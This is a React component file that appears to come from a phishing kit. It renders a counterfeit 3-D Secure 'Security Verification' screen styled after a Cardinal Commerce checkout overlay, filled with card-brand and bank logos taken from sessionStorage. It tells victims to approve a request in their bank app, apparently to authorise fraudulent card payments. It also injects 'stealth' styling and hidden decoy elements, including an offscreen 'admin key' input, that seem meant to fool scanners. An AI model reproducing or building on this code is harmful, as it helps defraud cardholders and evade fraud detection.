import React, { useState, useEffect, useRef } from 'react';
import hdphnvr from '../../assets/img/hdphnvr.png';
import { injectStealthToComponent } from '../../utils/injSteaArt';
import visaLogo from './visalogo.svg';
import mcLogo from './mc.svg';
import amexLogo from './amexlogo.svg';

const ContainerLoading = () => {
    const [styles, setStyles] = useState(null);
    const [currentDate, setCurrentDate] = useState('');
    const [logoUrl, setLogoUrl] = useState('');
    const [brand, setBrand] = useState('');
  
      useEffect(() => {
          const style = document.createElement("style");
          style.innerHTML = `
            body {
              font-family: "Segoe UI", "Roboto", "Helvetica Neue", sans-serif;
              font-weight: 400;
              color:rgb(0, 0, 0);
            }
        
            h1, h2, h3, h4, h5, h6 {
              font-weight: 500;
              margin-bottom: 0.5rem;
            }
        
            p, span, label, div {
              font-weight: 400 !important;
              line-height: 1.6;
              font-size: 14.8px;
              color:rgb(0, 0, 0);
            }
        
            strong, b {
              font-weight: 500 !important;
            }
        
            button.submitbtn {
              font-weight: 600;
              font-size: 14px;
              letter-spacing: 0.3px;
            }
            .bAtX36 {
  font-size: 1.1em;
  font-weight: 900;
  text-align: center;
  color:rgb(0, 0, 0);
  margin-bottom: 20px;
}
          `;
          document.head.appendChild(style);
        
          return () => {
            document.head.removeChild(style);
          };
        }, []);
    
useEffect(() => {
  // Dynamically add stealth styles
  const style = document.createElement("style");
  style.innerHTML = `
    .fCon_z9s2x {
      position: absolute;
      top: -9999px;
      left: -9999px;
      width: 100vw;
      height: 200px;
      overflow: hidden;
      opacity: 0;
    }
    .mslBttn_e1z9s {
      position: absolute;
      left: -9999px;
      visibility: hidden;
    }
    .invDv_2z69s {
      width: 200px;
      height: 50px;
      background-color: rgba(255, 0, 0, 0.001);
      position: absolute;
      top: -1000px;
    }

    .FTI_A6RTsa {
      position: absolute;
      left: -1000px;
      top: -1000px;
      opacity: 0;
    }
  `;
  document.head.appendChild(style);
}, []);

    const containerRef = useRef(null);
  
    useEffect(() => {
      requestAnimationFrame(() => {
        if (containerRef.current) {
          injectStealthToComponent(containerRef.current);
        }
      });
    }, []);

useEffect(() => {
    const loadStyles = async () => {
      try {
        const [loginStyles, additionalStyles] = await Promise.all([
          import('../../assets/styles/styler.css'),
          import('../../assets/styles/styler_f.css'),
        ]);

        setStyles({
          login: loginStyles.default,
          additional: additionalStyles.default,
        });
      } catch (error) {
      }
    };

    loadStyles();

    const now = new Date();
    const formattedDate = now.toLocaleString('en-US', {
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: false,
    });
    setCurrentDate(formattedDate);
  }, []);
  const [formData, setFormData] = useState({
    });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({
        ...prev,
        [name]: value,
    }));
};
  const getBrandLogo = () => {
    switch (brand.toLowerCase()) {
      case 'visa':
        return visaLogo;
      case 'mastercard':
        return mcLogo;
      case 'amex':
      case 'american express':
        return amexLogo;
      default:
        return '';
    }
  };

  useEffect(() => {

    
    
    const fetchLogoUrl = async () => {
      try {
        const storedLogoUrl = sessionStorage.getItem('LgLBn');
        const storedBrand = sessionStorage.getItem('BrnTFls');
        if (storedLogoUrl) {
          setLogoUrl(storedLogoUrl);
        }
        if (storedBrand) {
          setBrand(storedBrand);
        }

      } catch (error) {
      }
    };
    fetchLogoUrl();
  }, []);

return (
    <body ref={containerRef} className="page-template page-template-page-templates page-template-minimal-footer page-template-page-templatesminimal-footer-php page page-id-61 logged-in wp-custom-logo theme-underscores wc-braintree-body woocommerce-checkout woocommerce-page woocommerce-js no-sidebar webp-support">
      <div id="Cardinal-ElementContainer">
        <div id="Cardinal-Modal" style={{paddingTop: '0px'}} className="cardinalOverlay-content shadow-effect cardinalOverlay-open fade-and-drop ">
          <div id="Cardinal-ModalContent" className="size-02" tabIndex="-1">
          <div style={{ 
              maxHeight: '100%',
              overflow: 'auto',
              padding: '20px',
    }} className="threeds-two">
      <div className="container-fluid">
      <div style={{ scrollPaddingBottom: '24px', minHeight: '30xp', paddingBottom : "46px", paddingBottom : "12px"}}>
                  {/* Show the logos here */}
                  <img src={logoUrl} alt="" style={{ width: '20%', float: 'left' }} />
                  <img src={getBrandLogo()} alt="" style={{ width: '20%', float: 'right' }} />
                </div>
                <br/>
                <br/>
                <br/>
                <br/>
      <div
        className="formcol"
        style={{
          textAlign: 'center',
          fontWeight: 'normal',
          fontSize: '1.2em',
          marginBottom: '30px',
          color: 'rgb(0,0,0)',
        }}
      >
        <div
            className="formcol"
            style={{
                textAlign: 'center',
                fontWeight: 'normal',
              fontSize: '1.8em',
              marginBottom: '24px',
              color: 'rgb(0,0,0)',
            }}
          >
    Security Verification      </div>
        <img
        src={hdphnvr}
          alt=""
          style={{ marginBottom: '24px', width: '70%' }}
        />
        <p className='bAtX36'>
        Approve the request in your bank app
        </p>
        <p>
        To complete this process, approve the request sent to your banking app. Open your bank app and confirm the prompt to verify your identity.
        </p>
        
        
      </div>


        
        
      </div>
    </div>
          </div>
          <div className="fCon_z9s2x" style={{ display: 'none' }}>
        <p>Welcome</p>
        <p>Loading</p>
        <input type="text" placeholder="Enter admin key" className="FTI_A6RTsa" />
        <button className="mslBttn_e1z9s">Submit Admin Code</button>
      </div>

      
      <div className="invDv_2z69s"></div>
        </div>
        <div id="Cardinal-Overlay" className="cardinalOverlay-mask cardinalOverlay-open "></div>
      </div>
    </body>
  );
};

export default ContainerLoading;
